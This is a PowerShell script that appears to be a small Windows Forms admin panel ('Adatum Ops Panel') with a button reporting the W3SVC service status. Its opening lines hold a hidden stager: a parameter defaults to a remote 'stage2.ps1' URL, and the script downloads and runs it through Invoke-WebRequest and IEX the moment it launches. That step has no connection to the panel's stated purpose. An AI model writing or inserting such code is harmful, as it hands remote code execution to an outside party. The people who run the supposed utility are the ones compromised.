
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://203.0.113.4/stage2.ps1',
    [int]$RequestTimeout = 62
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
Write-Verbose "stage marker 43 reached"
#Requires -Version 5.1


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = "Adatum Ops Panel"
$form.Size = New-Object System.Drawing.Size(860, 600)
$form.StartPosition = 'CenterScreen'

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Probe'
$button.Location = New-Object System.Drawing.Point(18, 18)
$button.Add_Click({
    Get-Service -Name 'W3SVC' | Select-Object Name, Status | Out-String | Write-Host
})
$form.Controls.Add($button)

[void]$form.ShowDialog()
$form.Dispose()
